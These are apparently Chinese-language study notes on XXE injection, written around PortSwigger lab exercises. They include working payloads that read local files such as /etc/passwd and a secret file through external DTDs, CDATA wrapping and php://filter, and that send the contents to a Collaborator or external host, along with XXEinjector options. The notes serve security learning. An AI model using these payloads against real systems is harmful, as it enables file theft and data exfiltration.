大部分是可以通过burp pro->active scan 扫出来的，如果要加快速度，可以在Dashboard->scan configuration设置只扫描xxe.
除了用扫描器外，如果涉及到要用external DTD的话，可以参考下面的例子(查看solution)
https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration
基本思路就是把具体工作内容放在externel DTD,比如retrieve /etc/hostname
然后xml中去引用这个DTD。

https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages
上面两个例子都是通过external DTD来获取数据的，差别是一个是通过正常解析外带数据，另外一个是通过error message.关于error message这个还需要了解它的原理是啥才行。

By default, XInclude will try to parse the included document as XML. Since /etc/passwd isn't valid XML, you will need to add an extra attribute to the XInclude directive to change this behavior.
所以要把XML类型改为parse="text"

这个专题主要是要多看看外部DTD相关的XXE，包括下面这个结合file upload的
https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload

当要读取的内容包含有特殊字符（默认有“<”、“>”、“&”、“'”和“"”）这些特殊字符时:
当被读取文件中含有特殊符号时，不但没有预期想要的结果，还返回了一堆错误，这个时候就需要使用CDATA了，下面是引用WIKI中关于CDATA的介绍。
CDATA，意为character data，是标记语言SGML与XML，表示文档的特定部分是普通的字符数据，而不是非字符数据或有特定、限定结构的字符数据。在XML文档或外部实体中，一个CDATA section是一段按字面解释的内容，不作为标记文本。字符用CDATA节表示或者按照标准语法表示，并无差异。例如"<" 与 "&" 分别表示 "<
其实简单一点的来说也就是说，将脚本代码定义为 "CDATA" 后，CDATA 部分中的内容就会被解析器忽略，这个时候就可以读取文件了
<?xml version="1.0" encoding="utf-8"?><!DOCTYPE roottag [
<!ENTITY % start "<![CDATA[">  
<!ENTITY % goodies SYSTEM "file:///c:/flag.txt">
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://192.168.10.30/evil.dtd"> #本地IP%dtd; ]><roottag>&all;</roottag>

evil.dtd
<?xml version="1.0" encoding="UTF-8"?><!ENTITY all "%start;%goodies;%end;">

普通读取文件的方法：
<!ENTITY % file SYSTEM "file:///home/carlos/secret">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>

利用php伪协议来读取文件：
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///c:/flag.txt">或者file:///home/carlos/secret
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://external server?p=%file;'>"> #external server like collobrator

这里&#37;和&#x25;都表示%，区别是一个是10进制，一个是16进制。另外一个要注意的地方就是实体的引用顺序。

另外就是可以考虑用工具XXEinjector，如果是使用工具，有几个需要注意的地方。
1. --host 反向连接地址，可以是本地地址也可以是public server,主要目的是提供dtd文件和接收数据（比如外带数据)
 --file=metlnfo_req.txt 保存请求的文件
--path=C:/flag.txt 要读取的目标文件
--verbose 
--httpport=999 反向连接的端口号，不加这个参数默认是80.
--oob=http 
--phpfilter（用上面的php伪协议来处理)
